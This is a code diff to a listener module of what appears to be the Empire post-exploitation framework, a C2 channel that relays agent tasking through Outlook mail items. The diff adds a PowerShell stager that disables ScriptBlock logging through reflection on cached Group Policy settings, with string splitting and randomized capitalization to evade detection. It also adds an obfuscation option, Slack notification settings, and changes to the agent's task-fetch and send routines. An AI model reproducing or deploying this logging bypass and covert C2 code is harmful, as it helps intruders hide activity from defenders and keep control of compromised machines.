@@ -2,8 +2,10 @@ import logging
 import base64
 import random
 import os
+import ssl
 import time
 import copy
+import sys
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
 
@@ -56,16 +58,16 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   80
             },
-            'Launcher' : {
-                'Description'   :   'Launcher string.',
-                'Required'      :   True,
-                'Value'         :   'powershell -noP -sta -w 1 -enc '
-            },
             'StagingKey' : {
                 'Description'   :   'Staging key for initial agent negotiation.',
                 'Required'      :   True,
                 'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
             },
+            'Launcher' : {
+                 'Description'   :   'Launcher string.',
+                 'Required'      :   True,
+                 'Value'         :   'powershell -noP -sta -w 1 -enc '
+             },
             'DefaultDelay' : {
                 'Description'   :   'Agent delay/reach back interval (in seconds).',
                 'Required'      :   True,
@@ -115,6 +117,16 @@ class Listener:
                 'Description'   :   'The email address of our target',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -156,7 +168,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -178,10 +190,34 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
+                    # ScriptBlock Logging bypass
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    stager += "'System.Management.Automation.Utils'"
+                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    stager += "['ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("){$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}};")
+
                     # @mattifestation's AMSI bypass
-                    stager = helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
+                    stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
                     stager += "$outlook = New-Object -comobject Outlook.Application;"
                     stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
                     stager += 'MAPI");'
@@ -222,6 +258,8 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                if obfuscate:
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode:
                     return helpers.powershell_launcher(stager, launcher)
@@ -357,8 +395,11 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    function script:Get-Task {
+
+                    $script:GetTask = {
                         try {
+                                # keep checking to see if there is response
+                                #write-host "requesting task";
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
@@ -372,9 +413,9 @@ class Listener:
                                 $mail.save() | out-null;
                                 $mail.Move($fld)| out-null;
 
-                                # keep checking to see if there is response
                                 $break = $False;
                                 [byte[]]$b = @();
+                                $noTask = 0
 
                                 While ($break -ne $True){
                                   foreach ($item in $fld.Items) {
@@ -394,14 +435,14 @@ class Listener:
 
                         }
                         catch {
-
+                           #Start-Negotiate -S "$ser" -SK $sk -UA $ua;
                         }
                         while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
                     }
                 """
 
                 sendMessage = """
-                    function script:Send-Message {
+                   $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
@@ -587,7 +628,19 @@ class Listener:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
+                certPath = os.path.abspath(certPath)
+
+                # support any version of tls
+                pyversion = sys.version_info
+                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
+                    proto = ssl.PROTOCOL_TLS
+                elif pyversion[0] >= 3:
+                    proto = ssl.PROTOCOL_TLS
+                else:
+                    proto = ssl.PROTOCOL_SSLv23
+
+                context = ssl.SSLContext(proto)
+                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
